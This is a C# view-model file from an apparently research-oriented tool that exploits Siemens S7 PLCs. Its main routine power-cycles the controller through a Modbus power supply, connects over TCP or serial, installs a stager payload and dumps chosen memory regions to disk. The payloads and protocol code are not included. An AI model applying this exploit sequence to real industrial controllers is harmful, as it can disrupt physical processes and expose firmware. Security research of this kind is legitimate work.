#nullable enable
using S7_Csharp_Utility.Services;
using System.Windows.Input;
using System.Threading.Tasks;
using System;
using S7.Net;
using System.ComponentModel.DataAnnotations;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.IO.Ports;
using System.Threading;
using Avalonia.Threading;
using S7_Csharp_Utility.Models;

namespace S7_Csharp_Utility.ViewModels
{
    /// <summary>
    /// The main view model for the application.
    /// </summary>
    public class MainWindowViewModel : ViewModelBase
    {
        private const string ConfigFileName = "config.json";

        /// <summary>
        /// Gets the view model for the PLC connection.
        /// </summary>
        public PlcConnectionViewModel? PlcConnectionViewModel { get; private set; }

        /// <summary>
        /// Gets the view model for the Modbus power supply.
        /// </summary>
        public ModbusPowerSupplyViewModel? ModbusPowerSupplyViewModel { get; private set; }

        /// <summary>
        /// Gets the view model for the configuration.
        /// </summary>
        public ConfigurationViewModel ConfigurationViewModel { get; }

        /// <summary>
        /// Gets the view model for the file comparison.
        /// </summary>
        public FileCompareViewModel FileCompareViewModel { get; }

        /// <summary>
        /// Gets the logging service.
        /// </summary>
        public LoggingService Logging { get; }

        /// <summary>
        /// Gets the socat logging service.
        /// </summary>
        public SocatLoggerService SocatLogging { get; }
        private readonly S7.Net.PayloadManager _payloadManager;

        private string _dumpAddress = "0x691E28";
        /// <summary>
        /// Gets or sets the memory address to dump.
        /// </summary>
        [Required]
        [RegularExpression(@"^0x[0-9a-fA-F]+$", ErrorMessage = "Must be a valid hex address (e.g., 0x10000000)")]
        public string DumpAddress
        {
            get => _dumpAddress;
            set { _dumpAddress = value; OnPropertyChanged(); }
        }

        private uint _dumpLength = 16;
        /// <summary>
        /// Gets or sets the length of the memory to dump.
        /// </summary>
        [Range(1, uint.MaxValue)]
        public uint DumpLength
        {
            get => _dumpLength;
            set { _dumpLength = value; OnPropertyChanged(); }
        }

        private bool _isUploadingStager;
        /// <summary>
        /// Gets or sets a value indicating whether the stager is being uploaded.
        /// </summary>
        public bool IsUploadingStager
        {
            get => _isUploadingStager;
            set
            {
                _isUploadingStager = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
            }
        }

        private bool _isDumpingMemory;
        /// <summary>
        /// Gets or sets a value indicating whether memory is being dumped.
        /// </summary>
        public bool IsDumpingMemory
        {
            get => _isDumpingMemory;
            set
            {
                _isDumpingMemory = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
                ((Commands.RelayCommand)CancelDumpCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
            }
        }

        private CancellationTokenSource? _dumpCancellationTokenSource;

        private bool _isComparing;
        /// <summary>
        /// Gets or sets a value indicating whether files are being compared.
        /// </summary>
        public bool IsComparing
        {
            get => _isComparing;
            set
            {
                _isComparing = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)FileCompareViewModel.CompareDumpsCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)FileCompareViewModel.CompareTwoFilesCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
            }
        }

        private double _dumpProgressPercentage;
        /// <summary>
        /// Gets or sets the progress percentage of the memory dump.
        /// </summary>
        public double DumpProgressPercentage
        {
            get => _dumpProgressPercentage;
            set { _dumpProgressPercentage = value; OnPropertyChanged(); }
        }

        private string _dumpProgressBytes = "Read: 0 / 0 bytes";
        /// <summary>
        /// Gets or sets the progress of the memory dump in bytes.
        /// </summary>
        public string DumpProgressBytes
        {
            get => _dumpProgressBytes;
            set { _dumpProgressBytes = value; OnPropertyChanged(); }
        }

        private string _dumpProgressTime = "Elapsed: 0s | Remaining: calculating...";
        /// <summary>
        /// Gets or sets the progress of the memory dump in time.
        /// </summary>
        public string DumpProgressTime
        {
            get => _dumpProgressTime;
            set { _dumpProgressTime = value; OnPropertyChanged(); }
        }

        private bool _stagerInstalled;
        /// <summary>
        /// Gets or sets a value indicating whether the stager is installed.
        /// </summary>
        public bool StagerInstalled
        {
            get => _stagerInstalled;
            set
            {
                _stagerInstalled = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Gets or sets the path to the payloads.
        /// </summary>
        public string PayloadsPath
        {
            get => _payloadsPath;
            set { _payloadsPath = value; OnPropertyChanged(); _ = ScanPayloadsAsync(); }
        }
        private string _payloadsPath = ApplicationConfiguration.GetPayloadsPath();

        /// <summary>
        /// Gets the discovered payloads.
        /// </summary>
        public ObservableCollection<S7.Net.PayloadInfo> DiscoveredPayloads { get; } = new ObservableCollection<S7.Net.PayloadInfo>();

        private bool _isScanning;
        /// <summary>
        /// Gets or sets a value indicating whether payloads are being scanned.
        /// </summary>
        public bool IsScanning
        {
            get => _isScanning;
            set { _isScanning = value; OnPropertyChanged(); }
        }

        /// <summary>
        /// Gets or sets the path to the dumps.
        /// </summary>
        public string DumpsPath
        {
            get => _dumpsPath;
            set { _dumpsPath = value; OnPropertyChanged(); }
        }
        private string _dumpsPath = ApplicationConfiguration.GetDefaultDumpsPath();

        /// <summary>
        /// Gets or sets the path to the logs.
        /// </summary>
        public string LogsPath
        {
            get => _logsPath;
            set
            {
                _logsPath = value;
                OnPropertyChanged();
                string resolvedPath = ApplicationConfiguration.ResolvePath(value, ApplicationConfiguration.GetDefaultLogsPath());
                Logging.UpdateLogsPath(resolvedPath);
                SocatLogging.UpdateLogsPath(resolvedPath);
            }
        }
        private string _logsPath = ApplicationConfiguration.GetDefaultLogsPath();

        /// <summary>
        /// Gets or sets the path to the extraction folder.
        /// </summary>
        public string ExtractionPath
        {
            get => _extractionPath;
            set { _extractionPath = value; OnPropertyChanged(); }
        }
        private string _extractionPath = ApplicationConfiguration.GetDefaultExtractionPath();

        /// <summary>
        /// Gets the command to load a profile.
        /// </summary>
        public ICommand LoadProfileCommand { get; }
        /// <summary>
        /// Gets the command to start the exploit sequence.
        /// </summary>
        public ICommand StartExploitSequenceCommand { get; }
        /// <summary>
        /// Gets the command to dump memory.
        /// </summary>
        public ICommand DumpMemoryCommand { get; }
        /// <summary>
        /// Gets the command to cancel the memory dump.
        /// </summary>
        public ICommand CancelDumpCommand { get; }

        private readonly Interfaces.IDialogService _dialogService;
        /// <summary>
        /// Gets the configuration service.
        /// </summary>
        public ConfigurationService ConfigService { get; }

        private DeviceProfile? _loadedProfile;
        /// <summary>
        /// Gets or sets the loaded device profile.
        /// </summary>
        public DeviceProfile? LoadedProfile
        {
            get => _loadedProfile;
            set
            {
                _loadedProfile = value;
                OnPropertyChanged();
                OnPropertyChanged(nameof(MemoryRegions));
            }
        }

        /// <summary>
        /// Gets the memory regions of the loaded profile.
        /// </summary>
        public ObservableCollection<MemoryRegion> MemoryRegions => LoadedProfile?.Regions ?? new ObservableCollection<MemoryRegion>();

        private MemoryRegion? _selectedMemoryRegion;
        /// <summary>
        /// Gets or sets the selected memory region.
        /// </summary>
        public MemoryRegion? SelectedMemoryRegion
        {
            get => _selectedMemoryRegion;
            set
            {
                _selectedMemoryRegion = value;
                OnPropertyChanged();
                if (_selectedMemoryRegion != null)
                {
                    DumpAddress = _selectedMemoryRegion.Address;
                    DumpLength = _selectedMemoryRegion.Size;
                }
            }
        }

        /// <summary>
        /// Gets the view service.
        /// </summary>
        public Interfaces.IViewService ViewService { get; }

        /// <summary>
        /// Initializes a new instance of the <see cref="MainWindowViewModel"/> class.
        /// </summary>
        public MainWindowViewModel(LoggingService loggingService, PowerController powerController, S7.Net.PayloadManager payloadManager, Interfaces.IDialogService dialogService, SocatService socatService, ConfigurationService configService, SocatLoggerService socatLoggerService, Interfaces.IViewService viewService)
        {
            Logging = loggingService;
            SocatLogging = socatLoggerService;
            _payloadManager = payloadManager;
            _dialogService = dialogService;
            ConfigService = configService;
            ViewService = viewService;

            PlcConnectionViewModel = new PlcConnectionViewModel(socatService, dialogService, loggingService);
            ModbusPowerSupplyViewModel = new ModbusPowerSupplyViewModel(powerController, dialogService, loggingService);
            ConfigurationViewModel = new ConfigurationViewModel(this, dialogService, configService);
            FileCompareViewModel = new FileCompareViewModel(this, dialogService, loggingService, viewService);

            if (PlcConnectionViewModel != null)
            {
                PlcConnectionViewModel.SocatStatusChanged += (string status) =>
                {
                    ((Commands.AsyncRelayCommand)StartExploitSequenceCommand)?.RaiseCanExecuteChanged();
                };
            }
            if (ModbusPowerSupplyViewModel != null)
            {
                ModbusPowerSupplyViewModel.ModbusStatusChanged += (string status) =>
                {
                    ((Commands.AsyncRelayCommand)StartExploitSequenceCommand)?.RaiseCanExecuteChanged();
                };
            }

            StartExploitSequenceCommand = new Commands.AsyncRelayCommand(_ => StartExploitSequenceAsync(), _ => PlcConnectionViewModel?.SocatStatus == "Running" && ModbusPowerSupplyViewModel?.ModbusStatus == "Connected" && !IsUploadingStager && !IsDumpingMemory && !IsComparing, HandleException);
            DumpMemoryCommand = new Commands.AsyncRelayCommand(_ => DumpMemoryAsync(), _ => StagerInstalled && !IsUploadingStager && !IsDumpingMemory && !IsComparing, HandleException);
            CancelDumpCommand = new Commands.RelayCommand(_ => CancelDump(), _ => IsDumpingMemory);
            LoadProfileCommand = new Commands.AsyncRelayCommand(_ => LoadProfileAsync(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing, HandleException);
            
            _ = ScanPayloadsAsync();
        }

        private void HandleException(Exception ex)
        {
            Logging.Log($"An unexpected error occurred: {ex.ToString()}", LogCategory.Error);
            _dialogService.ShowMessageAsync("Unexpected Error", $"An unexpected error occurred: {ex.Message}");
        }

        private async Task LoadProfileAsync()
        {
            var path = await _dialogService.ShowOpenFileDialogAsync("Load Profile", "json", "JSON Profiles").ConfigureAwait(false);
            if (path != null)
            {
                var profile = await ConfigService.LoadProfileAsync(path).ConfigureAwait(false);
                if (profile != null)
                {
                    LoadedProfile = profile;
                }
            }
        }

        private S7.Net.Interfaces.ICommunicationChannel? CreateCommunicationChannel()
        {
            if (PlcConnectionViewModel?.SelectedCommunicationMode == "TCP (socat)")
            {
                return new S7.Net.Channels.TcpChannel(PlcConnectionViewModel.PlcHost ?? "localhost", PlcConnectionViewModel.PlcPort);
            }
            else if (PlcConnectionViewModel?.SelectedCommunicationMode == "Serial" && PlcConnectionViewModel.SelectedSerialPort != null)
            {
                return new S7.Net.Channels.SerialChannel(PlcConnectionViewModel.SelectedSerialPort, PlcConnectionViewModel.SelectedBaudRate, PlcConnectionViewModel.SelectedParity, PlcConnectionViewModel.SelectedStopBits, PlcConnectionViewModel.SelectedFlowControl);
            }
            return null;
        }
        
        private async Task StartExploitSequenceAsync()
        {
            if (ModbusPowerSupplyViewModel == null || PlcConnectionViewModel == null) return;

            IsUploadingStager = true;
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            try
            {
                Logging.Log("[EXPLOIT] Starting exploit sequence...", LogCategory.Info);
                await ModbusPowerSupplyViewModel.PowerCycleAsync(ModbusPowerSupplyViewModel.DelaySeconds);
                await Task.Delay(50);

                Logging.Log("[CONNECTION] Creating communication channel...", LogCategory.Info);
                channel = CreateCommunicationChannel();

                if (channel == null)
                {
                    throw new Exception("Could not create communication channel. PLC Connection View Model is not initialized.");
                }

                Logging.Log($"[CONNECTION] Connecting to PLC at {PlcConnectionViewModel.PlcHost}:{PlcConnectionViewModel.PlcPort}...", LogCategory.Info);
                await channel.ConnectAsync();

                if (!channel.IsConnected)
                {
                    throw new Exception("Failed to establish connection to PLC");
                }

                Logging.Log("[CONNECTION] ✅ Connected to PLC successfully", LogCategory.Info);
                var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                await RunStagerSequenceAsync(plcClient);
            }
            catch (TimeoutException timeoutEx)
            {
                Logging.Log($"[ERROR] ⏱️ Timeout during stager sequence: {timeoutEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Timeout Error",
                    $"The operation timed out. This may happen if:\n" +
                    $"• Socat is not running or has stopped\n" +
                    $"• PLC is not responding\n" +
                    $"• Network connection issues\n\n" +
                    $"Error: {timeoutEx.Message}");
            }
            catch (System.IO.IOException ioEx)
            {
                Logging.Log($"[ERROR] 🔌 Connection error during stager sequence: {ioEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Connection Error",
                    $"Connection to PLC was lost. This may happen if:\n" +
                    $"• Socat process was stopped\n" +
                    $"• Network connection was interrupted\n" +
                    $"• PLC stopped responding\n\n" +
                    $"Error: {ioEx.Message}");
            }
            catch (Exception ex)
            {
                Logging.Log($"[ERROR] ❌ Unexpected error during stager sequence: {ex.ToString()}", LogCategory.Error);
                if (ex.InnerException != null)
                {
                    Logging.Log($"[ERROR] Inner exception: {ex.InnerException.ToString()}", LogCategory.Error);
                }
                await _dialogService.ShowMessageAsync("Error", $"An error occurred during the stager sequence: {ex.Message}");
            }
            finally
            {
                try
                {
                    channel?.Disconnect();
                    Logging.Log("[CONNECTION] Disconnected from PLC", LogCategory.Debug);
                }
                catch (Exception disconnectEx)
                {
                    Logging.Log($"[WARNING] Error during disconnect: {disconnectEx.Message}", LogCategory.Warning);
                }
                IsUploadingStager = false;
                Logging.Log("[EXPLOIT] Exploit sequence completed", LogCategory.Info);
            }
        }

        private async Task RunStagerSequenceAsync(S7.Net.PlcClient plcClient)
        {
            StagerInstalled = false;
            if (!plcClient.IsConnected) return;

            if (await plcClient.PerformHandshakeAsync())
            {
                await plcClient.GetVersion();

                byte[] stagerPayload = await _payloadManager.GetStagerPayloadAsync(PayloadsPath);
                Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

                await plcClient.InstallStager(stagerPayload);
                StagerInstalled = true;
                Logging.Log("Stager is installed and ready.", LogCategory.Info);
            }
        }

        private async Task DumpMemoryAsync()
        {
            IsDumpingMemory = true;
            using (_dumpCancellationTokenSource = new CancellationTokenSource())
            {
                S7.Net.Interfaces.ICommunicationChannel? channel = null;

                DumpProgressPercentage = 0;
                DumpProgressBytes = "Read: 0 / 0 bytes";
                DumpProgressTime = "Elapsed: 0s | Remaining: calculating...";

                try
                {
                    if (!uint.TryParse(DumpAddress.Replace("0x", ""), System.Globalization.NumberStyles.HexNumber, System.Globalization.CultureInfo.CurrentCulture, out uint address))
                    {
                        Logging.Log("Error: Invalid dump address. Must be a valid hex number (e.g., 0x10000000).", LogCategory.Error);
                        await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump address. Must be a valid hex number (e.g., 0x10000000).");
                        return;
                    }
                    if (DumpLength == 0)
                    {
                        Logging.Log("Error: Invalid dump length. Must be a positive number.", LogCategory.Error);
                        await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump length. Must be a positive number.");
                        return;
                    }

                    channel = CreateCommunicationChannel();
                    if (channel == null)
                    {
                        throw new Exception("Could not create communication channel. PLC Connection View Model is not initialized.");
                    }
                    await channel.ConnectAsync();
                    var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                    await RunDumpSequenceAsync(plcClient, address, DumpLength, _dumpCancellationTokenSource.Token);
                }
                catch (OperationCanceledException)
                {
                    Logging.Log("Memory dump operation was cancelled by user.", LogCategory.Info);
                }
                catch (Exception ex)
                {
                    var errorMessage = $"An error occurred during the dump sequence: {ex.Message}";
                    Logging.Log(errorMessage + Environment.NewLine + ex.ToString(), LogCategory.Error);
                    await _dialogService.ShowMessageAsync("Error", errorMessage);
                }
                finally
                {
                    channel?.Disconnect();
                    IsDumpingMemory = false;
                }
            }
            _dumpCancellationTokenSource = null;
        }

        private void CancelDump()
        {
            _dumpCancellationTokenSource?.Cancel();
        }

        private async Task RunDumpSequenceAsync(S7.Net.PlcClient plcClient, uint address, uint length, CancellationToken cancellationToken)
        {
            Logging.Log($"Starting memory dump of {length} bytes from 0x{address:X8}...", LogCategory.Info);

            byte[] dumperPayload = await _payloadManager.GetMemoryDumperPayloadAsync(PayloadsPath);
            Logging.Log($"Loaded dumper payload ({dumperPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var progress = new Progress<long>(bytesRead =>
            {
                double percentage = (double)bytesRead / length * 100;
                var elapsed = stopwatch.Elapsed;
                double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsed.TotalSeconds : 0;
                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;

                Dispatch(() =>
                {
                    DumpProgressPercentage = percentage;
                    DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
                    DumpProgressTime = $"Elapsed: {elapsed.TotalSeconds:F0}s | Remaining: {remainingSeconds:F0s}";
                });
            });

            var dumpedData = await plcClient.DumpMemoryAsync(address, length, dumperPayload, progress);
            stopwatch.Stop();

            string resolvedDumpsPath = ApplicationConfiguration.ResolvePath(DumpsPath, ApplicationConfiguration.GetDefaultDumpsPath());
            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
            string fullPath = System.IO.Path.Combine(resolvedDumpsPath, outFilename);
            
            await System.IO.File.WriteAllBytesAsync(fullPath, dumpedData, cancellationToken);
            Logging.Log($"Successfully dumped {dumpedData.Length} bytes to {fullPath} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
        }

        /// <summary>
        /// Loads the application configuration on startup.
        /// </summary>
        public async Task LoadConfigurationOnStartup()
        {
            try
            {
                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                var config = await ConfigService.LoadConfigurationAsync(path);
                if (config != null && PlcConnectionViewModel != null && ModbusPowerSupplyViewModel != null)
                {
                    PlcConnectionViewModel.PlcHost = config.PlcHost ?? "localhost";
                    PlcConnectionViewModel.PlcPort = config.PlcPort;
                    ModbusPowerSupplyViewModel.ModbusHost = config.ModbusHost ?? "localhost";
                    ModbusPowerSupplyViewModel.ModbusPort = config.ModbusPort;
                    ModbusPowerSupplyViewModel.ModbusCoil = config.ModbusCoil;
                    ModbusPowerSupplyViewModel.DelaySeconds = config.DelaySeconds;
                    DumpAddress = config.DumpAddress ?? "0x691E28";
                    DumpLength = config.DumpLength;
                    FileCompareViewModel.CompareFolder = config.CompareFolder ?? string.Empty;
                    FileCompareViewModel.CompareFile1 = config.CompareFile1 ?? string.Empty;
                    FileCompareViewModel.CompareFile2 = config.CompareFile2 ?? string.Empty;
                    PlcConnectionViewModel.SelectedSerialPort = config.SelectedSerialPort ?? string.Empty;
                    PlcConnectionViewModel.SocatTcpPort = config.SocatTcpPort;
                    PlcConnectionViewModel.SelectedBaudRate = config.SelectedBaudRate;
                    PlcConnectionViewModel.SelectedParity = config.SelectedParity;
                    PlcConnectionViewModel.SelectedStopBits = config.SelectedStopBits;
                    PlcConnectionViewModel.SelectedFlowControl = config.SelectedFlowControl;
                    PlcConnectionViewModel.SocatVerbose = config.SocatVerbose;
                    PlcConnectionViewModel.SocatHexDump = config.SocatHexDump;
                    PlcConnectionViewModel.SocatBlockSize = config.SocatBlockSize;
                    ConfigurationViewModel.PayloadsPath = config.PayloadsPath ?? ApplicationConfiguration.GetPayloadsPath();
                    ConfigurationViewModel.DumpsPath = config.DumpsPath ?? ApplicationConfiguration.GetDefaultDumpsPath();
                    ConfigurationViewModel.LogsPath = config.LogsPath ?? ApplicationConfiguration.GetDefaultLogsPath();
                    ConfigurationViewModel.ExtractionPath = config.ExtractionPath ?? ApplicationConfiguration.GetDefaultExtractionPath();
                }
                else
                {
                    await SaveConfigurationOnExit();
                    Logging.Log($"No configuration found. Created default configuration at {path}.", LogCategory.Info);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not load or create configuration: {ex.ToString()}", LogCategory.Warning);
            }

            string resolvedLogsPath = ApplicationConfiguration.ResolvePath(LogsPath, ApplicationConfiguration.GetDefaultLogsPath());
            Logging.UpdateLogsPath(resolvedLogsPath);
            SocatLogging.UpdateLogsPath(resolvedLogsPath);
        }

        /// <summary>
        /// Saves the application configuration on exit.
        /// </summary>
        public async Task SaveConfigurationOnExit()
        {
            try
            {
                if (PlcConnectionViewModel == null || ModbusPowerSupplyViewModel == null)
                {
                    Logging.Log("Cannot save configuration: ViewModels are not initialized.", LogCategory.Warning);
                    return;
                }

                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                var config = new ApplicationConfiguration
                {
                    PlcHost = PlcConnectionViewModel.PlcHost ?? "localhost",
                    PlcPort = PlcConnectionViewModel.PlcPort,
                    ModbusHost = ModbusPowerSupplyViewModel.ModbusHost ?? "localhost",
                    ModbusPort = ModbusPowerSupplyViewModel.ModbusPort,
                    ModbusCoil = ModbusPowerSupplyViewModel.ModbusCoil,
                    DelaySeconds = ModbusPowerSupplyViewModel.DelaySeconds,
                    DumpAddress = DumpAddress,
                    DumpLength = DumpLength,
                    CompareFolder = FileCompareViewModel.CompareFolder,
                    CompareFile1 = FileCompareViewModel.CompareFile1,
                    CompareFile2 = FileCompareViewModel.CompareFile2,
                    SelectedSerialPort = PlcConnectionViewModel.SelectedSerialPort ?? string.Empty,
                    SocatTcpPort = PlcConnectionViewModel.SocatTcpPort,
                    SelectedBaudRate = PlcConnectionViewModel.SelectedBaudRate,
                    SelectedParity = PlcConnectionViewModel.SelectedParity,
                    SelectedStopBits = PlcConnectionViewModel.SelectedStopBits,
                    SelectedFlowControl = PlcConnectionViewModel.SelectedFlowControl,
                    SocatVerbose = PlcConnectionViewModel.SocatVerbose,
                    SocatHexDump = PlcConnectionViewModel.SocatHexDump,
                    SocatBlockSize = PlcConnectionViewModel.SocatBlockSize,
                    PayloadsPath = ConfigurationViewModel.PayloadsPath,
                    DumpsPath = ConfigurationViewModel.DumpsPath,
                    LogsPath = ConfigurationViewModel.LogsPath,
                    ExtractionPath = ConfigurationViewModel.ExtractionPath
                };
                await ConfigService.SaveConfigurationAsync(config, path);
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not save configuration: {ex.ToString()}", LogCategory.Error);
            }
        }

        private async Task ScanPayloadsAsync()
        {
            if (IsScanning || string.IsNullOrWhiteSpace(PayloadsPath))
                return;

            IsScanning = true;
            
            try
            {
                var payloads = await Task.Run(() => _payloadManager.ScanPayloads(PayloadsPath));

                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    DiscoveredPayloads.Clear();
                    foreach (var payload in payloads)
                    {
                        DiscoveredPayloads.Add(payload);
                    }
                });

                Logging.Log($"Payload scan completed. Found {payloads.Count} payload files in {PayloadsPath}", LogCategory.Info);

                foreach (var payload in payloads)
                {
                    Logging.Log($"  - {payload.Type}: {payload.RelativePath} ({payload.Size} bytes)", LogCategory.Debug);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error scanning payloads: {ex.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"Error scanning payloads: {ex.Message}");
            }
            finally
            {
                IsScanning = false;
            }
        }
    }
}
